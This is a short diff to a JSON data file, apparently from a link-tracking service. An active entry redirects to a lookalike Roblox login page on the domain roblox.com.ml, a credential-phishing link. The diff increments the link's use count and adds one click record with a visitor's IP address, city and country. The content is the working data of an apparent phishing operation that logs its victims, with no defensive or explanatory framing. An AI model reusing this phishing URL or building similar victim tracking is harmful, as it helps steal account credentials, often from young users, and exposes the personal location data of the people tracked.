@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 379,
+    "useCount": 380,
     "createdBy": "admin",
     "clicks": [
       {
@@ -3144,6 +3144,14 @@
         "city": "Tbilisi",
         "flag": "🇬🇪",
         "countryCode": "GE"
+      },
+      {
+        "timestamp": 1777039192658,
+        "ip": "174.209.195.241",
+        "country": "United States",
+        "city": "Atlanta",
+        "flag": "🇺🇸",
+        "countryCode": "US"
       }
     ]
   },
